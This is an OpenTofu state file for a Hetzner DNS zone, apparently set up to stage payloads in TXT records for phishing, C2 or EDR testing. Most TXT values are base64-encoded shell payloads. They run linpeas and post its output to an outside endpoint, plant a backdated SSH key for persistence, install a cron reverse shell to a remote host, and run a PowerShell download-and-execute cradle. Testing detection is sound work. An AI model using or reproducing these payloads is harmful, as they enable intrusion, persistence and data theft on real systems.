{"version":4,"terraform_version":"1.11.5","serial":5,"lineage":"8a778631-b8d0-383d-5873-f53e5eda0714","outputs":{},"resources":[{"mode":"managed","type":"hcloud_zone","name":"m41w423mu572un","provider":"provider[\"registry.opentofu.org/hetznercloud/hcloud\"]","instances":[{"schema_version":0,"attributes":{"authoritative_nameservers":{"assigned":["hydrogen.ns.hetzner.com.","oxygen.ns.hetzner.com.","helium.ns.hetzner.de."]},"delete_protection":false,"id":879433,"labels":{},"mode":"primary","name":"m41w423mu572un.xyz","primary_nameservers":[],"registrar":"other","ttl":3600},"sensitive_attributes":[]}]},{"mode":"managed","type":"hcloud_zone_rrset","name":"a_c2_malware_edr_tester","provider":"provider[\"registry.opentofu.org/hetznercloud/hcloud\"]","instances":[{"schema_version":0,"attributes":{"change_protection":false,"id":"c2-malware-edr-tester/A","labels":{},"name":"c2-malware-edr-tester","records":[{"comment":null,"value":"35.228.196.57"}],"ttl":60,"type":"A","zone":"m41w423mu572un.xyz"},"sensitive_attributes":[],"dependencies":["hcloud_zone.m41w423mu572un"]}]},{"mode":"managed","type":"hcloud_zone_rrset","name":"a_phish_tester","provider":"provider[\"registry.opentofu.org/hetznercloud/hcloud\"]","instances":[{"schema_version":0,"attributes":{"change_protection":false,"id":"phish-tester/A","labels":{},"name":"phish-tester","records":[{"comment":null,"value":"34.88.103.162"}],"ttl":60,"type":"A","zone":"m41w423mu572un.xyz"},"sensitive_attributes":[],"dependencies":["hcloud_zone.m41w423mu572un"]}]},{"mode":"managed","type":"hcloud_zone_rrset","name":"txt_absalomabsalomortherottersclub","provider":"provider[\"registry.opentofu.org/hetznercloud/hcloud\"]","instances":[{"schema_version":0,"attributes":{"change_protection":false,"id":"absalomabsalomortherottersclub/TXT","labels":{},"name":"absalomabsalomortherottersclub","records":[{"comment":null,"value":"\"4dCBodHRwczovL2VvaW8yMGhnam5icHg4eS5tLnBpcGVkcmVhbS5uZXQvICYmIHJtIC9kZXYvc2htL28udHh0ICMgYmFzaCBjcmFkbGUgYnkgZGlsbGlnZW50X2IwMGt3MHJtCg==\""},{"comment":null,"value":"\"Y3VybCAtTCBodHRwczovL2dpdGh1Yi5jb20vY2FybG9zcG9sb3AvUEVBU1MtbmcvcmVsZWFzZXMvbGF0ZXN0L2Rvd25sb2FkL2xpbnBlYXMuc2ggfCBzaCA+IC9kZXYvc2htL28udHh0ICYmIGN1cmwgLVggUE9TVCAtSCAiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiIC1kIEAvZGV2L3NobS9vLnR\""}],"ttl":60,"type":"TXT","zone":"m41w423mu572un.xyz"},"sensitive_attributes":[],"dependencies":["hcloud_zone.m41w423mu572un"]}]},{"mode":"managed","type":"hcloud_zone_rrset","name":"txt_multipass","provider":"provider[\"registry.opentofu.org/hetznercloud/hcloud\"]","instances":[{"schema_version":0,"attributes":{"change_protection":false,"id":"multipass/TXT","labels":{},"name":"multipass","records":[{"comment":null,"value":"\"c3NoLWVkMjU1MTkgQUFBQUMzTnphQzFsWkRJMU5URTVBQUFBSUdBbkV3aWczTFBPMkdyUkgvQkZFWHhWK2EvN1pNYUxpdzhDQlphbFBPd3cK\""}],"ttl":60,"type":"TXT","zone":"m41w423mu572un.xyz"},"sensitive_attributes":[],"dependencies":["hcloud_zone.m41w423mu572un"]}]},{"mode":"managed","type":"hcloud_zone_rrset","name":"txt_opentofu","provider":"provider[\"registry.opentofu.org/hetznercloud/hcloud\"]","instances":[{"schema_version":0,"attributes":{"change_protection":false,"id":"opentofu/TXT","labels":{},"name":"opentofu","records":[{"comment":null,"value":"\"sometext\""}],"ttl":3600,"type":"TXT","zone":"m41w423mu572un.xyz"},"sensitive_attributes":[],"dependencies":["hcloud_zone.m41w423mu572un"]}]},{"mode":"managed","type":"hcloud_zone_rrset","name":"txt_pneumono","provider":"provider[\"registry.opentofu.org/hetznercloud/hcloud\"]","instances":[{"schema_version":0,"attributes":{"change_protection":false,"id":"pneumonoultramicroscopicsilicovolcanoconiosis/TXT","labels":{},"name":"pneumonoultramicroscopicsilicovolcanoconiosis","records":[{"comment":null,"value":"\"b2xkZXN0X3VzZXI9JChscyAtbHQgL2hvbWUgfCB0YWlsIC1uIDEgfCBhd2sgJ3twcmludCAkOX0nKSAmJiBrZXk9JChkaWcgK3Nob3J0IFRYVCBtdWx0aXBhc3MubTQxdzQyM211NTcydW4ueHl6IHwgdHIgLWQgJyInIHwgYmFzZTY0IC1kKSAmJiBlY2hvICIka2V5IiA+PiAvaG9tZS8kb2xkZXN0X3VzZXIvLnNzaC9hdXRob3JpemVkX2t\""},{"comment":null,"value":"\"leXMgJiYgdG91Y2ggLWQgIjIgbW9udGhzIGFnbyIgL2hvbWUvJG9sZGVzdF91c2VyLy5zc2gvYXV0aG9yaXplZF9rZXlzICYmIGVjaG8gInBlcnNpc3RlbmNlIGFkZGVkIGFuZCBhdXRob3JpemVkX2tleXMgYmFja2RhdGVkIGZvciB1c2VyOiAkb2xkZXN0X3VzZXIiICMgc3NoIHNoZW5hbmlnYW5zIGJ5IDBibm94aW91c18wd2wK\""}],"ttl":60,"type":"TXT","zone":"m41w423mu572un.xyz"},"sensitive_attributes":[],"dependencies":["hcloud_zone.m41w423mu572un"]}]},{"mode":"managed","type":"hcloud_zone_rrset","name":"txt_ps","provider":"provider[\"registry.opentofu.org/hetznercloud/hcloud\"]","instances":[{"schema_version":0,"attributes":{"change_protection":false,"id":"ps/TXT","labels":{},"name":"ps","records":[{"comment":null,"value":"\"powershell -nop -c \\\"iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/kaywoz/bluestuff/main/powershell/Payload-nonsense.ps1')\\\"\""}],"ttl":60,"type":"TXT","zone":"m41w423mu572un.xyz"},"sensitive_attributes":[],"dependencies":["hcloud_zone.m41w423mu572un"]}]},{"mode":"managed","type":"hcloud_zone_rrset","name":"txt_second","provider":"provider[\"registry.opentofu.org/hetznercloud/hcloud\"]","instances":[{"schema_version":0,"attributes":{"change_protection":false,"id":"second/TXT","labels":{},"name":"second","records":[{"comment":null,"value":"\"placeholder bash\""}],"ttl":60,"type":"TXT","zone":"m41w423mu572un.xyz"},"sensitive_attributes":[],"dependencies":["hcloud_zone.m41w423mu572un"]}]},{"mode":"managed","type":"hcloud_zone_rrset","name":"txt_test","provider":"provider[\"registry.opentofu.org/hetznercloud/hcloud\"]","instances":[{"schema_version":0,"attributes":{"change_protection":false,"id":"test/TXT","labels":{},"name":"test","records":[{"comment":null,"value":"\"aG9zdG5hbWU=\""}],"ttl":60,"type":"TXT","zone":"m41w423mu572un.xyz"},"sensitive_attributes":[],"dependencies":["hcloud_zone.m41w423mu572un"]}]},{"mode":"managed","type":"hcloud_zone_rrset","name":"txt_trainstation","provider":"provider[\"registry.opentofu.org/hetznercloud/hcloud\"]","instances":[{"schema_version":0,"attributes":{"change_protection":false,"id":"trainstation/TXT","labels":{},"name":"trainstation","records":[{"comment":null,"value":"\"https://key.m41w423mu572un.xyz/trainticket.ps1\""}],"ttl":60,"type":"TXT","zone":"m41w423mu572un.xyz"},"sensitive_attributes":[],"dependencies":["hcloud_zone.m41w423mu572un"]}]},{"mode":"managed","type":"hcloud_zone_rrset","name":"txt_wolfeschlegel","provider":"provider[\"registry.opentofu.org/hetznercloud/hcloud\"]","instances":[{"schema_version":0,"attributes":{"change_protection":false,"id":"wolfeschlegelsteinhausenbergerdorff/TXT","labels":{},"name":"wolfeschlegelsteinhausenbergerdorff","records":[{"comment":null,"value":"\"KHN1YmRvbWFpbj0kKGRpZyArc2hvcnQgVFhUIGxsYW5mYWlycHdsbGd3eW5neWxsZ29nZXJ5Y2h3eXJuZHJvYnd5bGxsbGFudHlzaWxpb2dvZ29nb2NoLm9idmlvdXNwaGlzaC5jb20gfCB0ciAtZCAnIicgfCBiYXNlNjQgLWRpKTsgY3JvbnRhYiAtbCA+IC50YWI7IGVjaG8gIjIgKiAqICogKiAvYmluL2Jhc2ggLWwgPiAvZGV2L3RjcC8\""},{"comment":null,"value":"\"kc3ViZG9tYWluLm9idmlvdXNwaGlzaC5jb20vNDI0MiAwPCYxIDI+JjEiID4+IC50YWI7IGNyb250YWIgLnRhYjsgcm0gLnRhYikgPiAvZGV2L251bGwgMj4mMSAjIG1pc2NoaWVmIGFuZCBtaXNkaXJlY3Rpb24gYnkgbGlsTTBua3kK\""}],"ttl":60,"type":"TXT","zone":"m41w423mu572un.xyz"},"sensitive_attributes":[],"dependencies":["hcloud_zone.m41w423mu572un"]}]}],"check_results":null}
